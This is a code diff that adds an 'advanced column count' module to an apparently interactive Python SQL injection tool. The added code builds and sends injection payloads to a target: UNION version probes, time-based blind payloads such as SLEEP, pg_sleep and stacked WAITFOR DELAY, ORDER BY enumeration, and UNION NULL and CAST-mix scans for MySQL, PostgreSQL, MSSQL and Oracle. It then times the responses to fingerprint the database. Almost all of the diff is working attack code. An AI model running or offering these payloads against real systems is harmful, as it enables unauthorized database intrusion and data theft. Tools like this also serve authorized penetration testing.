@@ -3,6 +3,8 @@ from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse, u
 from urllib.parse import quote
 import sys, os, re, time, hashlib, itertools
 import importlib.util
+from time import perf_counter
+
 
 # Optional deps
 try:
@@ -1260,6 +1262,249 @@ def prompt_open_results_in_browser(last_prepared: dict):
             break
 
 
+
+# ======== Column Count (Advanced) helpers ========
+
+DBMS_PROFILES = {
+    "MySQL": {
+        "version_expr": "@@version",
+        "time_func": "SLEEP({sec})",
+        "cast_str": "CAST('x' AS CHAR)",
+        "cast_int": "CAST(NULL AS SIGNED)",
+        "needs_dual": False,
+        "comment_styles": ["-- ", "#", "/*"]
+    },
+    "PostgreSQL": {
+        "version_expr": "version()",
+        "time_func": "pg_sleep({sec})",
+        "cast_str": "CAST('x' AS TEXT)",
+        "cast_int": "CAST(NULL AS INTEGER)",
+        "needs_dual": False,
+        "comment_styles": ["-- ", "/*"]
+    },
+    "MSSQL": {
+        "version_expr": "@@version",
+        "time_func": "WAITFOR DELAY '0:0:{sec}'",
+        "cast_str": "CAST('x' AS NVARCHAR(100))",
+        "cast_int": "CAST(NULL AS INT)",
+        "needs_dual": False,
+        "comment_styles": ["-- ", "/*"]
+    },
+    "Oracle": {
+        "version_expr": "banner FROM v$version",
+        "time_func": "dbms_lock.sleep({sec})",
+        "cast_str": "CAST('x' AS VARCHAR2(100))",
+        "cast_int": "CAST(NULL AS NUMBER)",
+        "needs_dual": True,
+        "comment_styles": ["-- ", "/*"]
+    }
+}
+
+TRAILING_COMMENTS = ["-- ", "--+", "#", "/*"]
+
+def _mk_null_list(n: int) -> str:
+    return ",".join(["NULL"] * n)
+
+def _mk_cast_mix(n: int, cast_str: str, cast_int: str) -> str:
+    cols = []
+    for i in range(n):
+        cols.append(cast_str if i % 2 == 0 else cast_int)
+    return ",".join(cols)
+
+def _apply_quotes(payload: str, need_quotes: bool) -> str:
+    return ("' " + payload) if need_quotes else (" " + payload)
+
+def _stacked_time_payload_mssql(sec_int: int, need_quotes: bool, comment_style: str) -> str:
+    # Builds stacked query:  ' ; WAITFOR DELAY '0:0:5'-- 
+    core = f"; WAITFOR DELAY '0:0:{sec_int}'"
+    if need_quotes:
+        pay = "' " + core
+    else:
+        pay = " " + core
+    if comment_style == "/*":
+        pay += "/*+*/"
+    else:
+        pay += comment_style
+    return pay
+
+
+def _append_comment(payload: str, comment_style: str, dbms: str) -> str:
+    if comment_style == "/*":
+        # safer: open+close to avoid parser quirks
+        return payload + "/*+*/"
+    return payload + comment_style
+
+
+def _send_and_measure(ic, req_builder, label: str, payload: str):
+    prepared = req_builder(payload)
+    if not prepared:
+        return []
+    rows = []
+    for rk, req in prepared.items():
+        t0 = perf_counter()
+        r = ic.send(req)
+        t1 = perf_counter()
+        if r is None:
+            rows.append((label, rk, None, None, None, t1 - t0, "send-failed"))
+        else:
+            body = r.text or ""
+            rows.append((label, rk, r.status_code, len(body), _short_hash(body), t1 - t0, "ok"))
+    return rows
+
+def _print_rows(rows):
+    for (label, rk, st, ln, hh, dt, note) in rows:
+        print(f"{label} @ {rk}\n  -> status={st} len={ln} hash={hh} time={dt:.3f}s note={note}")
+
+
+def run_column_counter_advanced(ic):
+    if not ic or not ic.prepared_data or not ic.selected_keys:
+        print("[-] No inputs selected. Use option 2 first.")
+        return
+
+    try:
+        max_c = int(input("Max columns to try (default 12): ").strip() or "12")
+        max_c = max(1, min(max_c, 64))
+    except:
+        max_c = 12
+
+    qneed_in = input("Does target need a breaking quote? 1(yes)/0(no) [default 1]: ").strip()
+    need_quotes = (qneed_in in ("", "1", "۱", "y", "yes"))
+
+    print("\nWhich DBMS profiles to test? (comma-separated or 'all'):")
+    dbms_names = list(DBMS_PROFILES.keys())
+    for i, name in enumerate(dbms_names, 1):
+        print(f"  {i}. {name}")
+    sel = input("> ").strip().lower()
+    chosen = []
+    if sel in ("", "all", "a", "*"):
+        chosen = dbms_names
+    else:
+        try:
+            idxs = parse_multi_indices(sel, len(dbms_names))
+            for i in idxs:
+                chosen.append(dbms_names[i-1])
+        except:
+            chosen = dbms_names
+
+    use_comment_styles = []
+    print("\nUse trailing comments (global)? default=all [-- , --+, #, /*]")
+    inp = input("Enter like '1,3' by order or leave empty for all: ").strip()
+    if not inp:
+        use_comment_styles = TRAILING_COMMENTS[:]
+    else:
+        try:
+            idxs = parse_multi_indices(inp, len(TRAILING_COMMENTS))
+            for i in idxs:
+                use_comment_styles.append(TRAILING_COMMENTS[i-1])
+        except:
+            use_comment_styles = TRAILING_COMMENTS[:]
+
+    tb_in = input("\nEnable time-based probe per DBMS? 1(yes)/0(no) [default 1]: ").strip()
+    enable_time = (tb_in in ("", "1", "۱", "y", "yes"))
+    try:
+        tb_sec = float(input("Time delay seconds (default 2): ").strip() or "2")
+        if tb_sec < 1e-3: tb_sec = 2.0
+    except:
+        tb_sec = 2.0
+    try:
+        threshold = float(input("Timeout threshold to flag 'delay' (seconds, default 1.2): ").strip() or "1.2")
+    except:
+        threshold = 1.2
+
+    def _req_builder(payload: str):
+        return ic.prepare_injection(payload)
+
+    print("\n[+] Running DBMS hint probes (version/time). We WILL NOT decide; only printing raw outcomes.")
+    for name in chosen:
+        prof = DBMS_PROFILES[name]
+        comment_pool = list(dict.fromkeys(use_comment_styles + prof["comment_styles"]))
+
+        # Version probe via UNION (use version_expr correctly)
+        for com in comment_pool:
+            vexpr = prof["version_expr"]
+            if " FROM " in vexpr.upper():
+                # e.g., Oracle: "banner FROM v$version"
+                core = f"SELECT {vexpr}"
+            else:
+                # put version() / @@version in col#1, rest NULL up to max_c
+                cols = [vexpr] + (["NULL"] * (max_c - 1))
+                core = f"SELECT {','.join(cols)}"
+            if prof["needs_dual"] and " FROM " not in vexpr.upper():
+                core += " FROM dual"
+            pay = f"UNION {core}"
+            pay = _apply_quotes(pay, need_quotes)
+            pay = _append_comment(pay, com, name)
+            rows = _send_and_measure(ic, _req_builder, f"[{name}][version-probe:{com.strip()}]", pay)
+            _print_rows(rows)
+
+
+        if enable_time:
+            for com in comment_pool:
+                if name == "MSSQL":
+                    # Stacked query for MSSQL
+                    sec_i = int(round(tb_sec))
+                    pay = _stacked_time_payload_mssql(sec_i, need_quotes, com)
+                    rows = _send_and_measure(ic, _req_builder, f"[{name}][time-probe:stacked:{com.strip()}]", pay)
+                else:
+                    tf = prof["time_func"]
+                    if "{sec}" in tf:
+                        time_expr = tf.format(sec=str(tb_sec))
+                    else:
+                        time_expr = tf
+                    cols = [time_expr] + (["NULL"] * (max_c - 1))
+                    core = f"SELECT {','.join(cols)}"
+                    if prof["needs_dual"]:
+                        core += " FROM dual"
+                    pay = f"UNION {core}"
+                    pay = _apply_quotes(pay, need_quotes)
+                    pay = _append_comment(pay, com, name)
+                    rows = _send_and_measure(ic, _req_builder, f"[{name}][time-probe:{com.strip()}]", pay)
+
+                for (label, rk, st, ln, hh, dt, note) in rows:
+                    hint = "DELAY" if dt >= threshold else "no-delay"
+                    print(f"  -> time-hint: {hint} (thr={threshold}s)")
+
+    print("\n[+] ORDER BY scan (generic, no DBMS-lock-in)")
+    for com in use_comment_styles:
+        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
+        for i in range(1, max_c + 1):
+            pay = f"ORDER BY {i}"
+            pay = _apply_quotes(pay, need_quotes)
+            pay = _append_comment(pay, com, "generic")
+            rows = _send_and_measure(ic, _req_builder, f"[ORDERBY i={i}:{com.strip()}]", pay)
+            _print_rows(rows)
+
+    print("\n[+] UNION NULL scan (generic)")
+    for com in use_comment_styles:
+        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
+        for i in range(1, max_c + 1):
+            nulls = _mk_null_list(i)
+            pay = f"UNION SELECT {nulls}"
+            pay = _apply_quotes(pay, need_quotes)
+            pay = _append_comment(pay, com, "generic")
+            rows = _send_and_measure(ic, _req_builder, f"[UNION-NULL cols={i}:{com.strip()}]", pay)
+            _print_rows(rows)
+
+    print("\n[+] UNION CAST-mix scan (to handle strict type checks)")
+    for name in chosen:
+        prof = DBMS_PROFILES[name]
+        comment_pool = list(dict.fromkeys(use_comment_styles + prof["comment_styles"]))
+        for com in comment_pool:
+            print(f"\n== {name} CAST-mix  comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
+            for i in range(1, max_c + 1):
+                cols = _mk_cast_mix(i, prof["cast_str"], prof["cast_int"])
+                core = f"SELECT {cols}"
+                if prof["needs_dual"]:
+                    core += " FROM dual"
+                pay = f"UNION {core}"
+                pay = _apply_quotes(pay, need_quotes)
+                pay = _append_comment(pay, com, name)
+                rows = _send_and_measure(ic, _req_builder, f"[{name} UNION-CAST cols={i}:{com.strip()}]", pay)
+                _print_rows(rows)
+
+    print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")
+
+
 # ------------------- app loop -------------------
 def main():
     ic = None
@@ -1292,6 +1537,7 @@ def main():
         print("12) Data Type Tester (per column)")
         print("13) DB Version Probe (UNION)")
         print("14) DB Info Interactive (UNION builder)")
+        print("15) Column Count Helper (Advanced, multi-DBMS, CAST/Time/Boolean-friendly)")
         choice = input("> ").strip()
 
         if choice in ("9", "۹"):
@@ -1562,6 +1808,12 @@ def main():
             ensure_ic()
             run_db_info_interactive(ic)
             continue
+
+        if choice in ("15", "۱۵"):
+            ensure_ic()
+            run_column_counter_advanced(ic)
+            continue
+
 
         print("[-] Invalid choice.")
 
